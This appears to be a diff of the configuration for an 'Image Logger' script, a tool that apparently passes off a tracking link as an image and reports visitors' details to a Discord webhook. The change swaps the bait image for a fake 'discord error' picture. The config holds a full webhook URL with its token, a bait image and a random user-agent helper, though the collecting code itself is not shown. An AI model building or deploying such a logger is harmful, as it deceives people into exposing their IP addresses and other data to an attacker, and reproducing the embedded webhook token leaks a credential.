@@ -15,7 +15,7 @@ def get_random_ua():
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1526403537037426698/w0WhkvyaaQ7FagPqEzQHQyHFjrP4oAfvLv6RUiJLxZX2xbss73DPMeCtQwhZeUfDLdhH",
-    "image": "https://upload.wikimedia.org/wikipedia/en/4/4d/Shrek_%28character%29.png",
+    "image": "https://media.tenor.com/bQ8wPB_DovAAAAAe/discord-error-shit.png",
     "imageArgument": True,
     "username": "Image Logger",
     "color": 0x00FFFF,
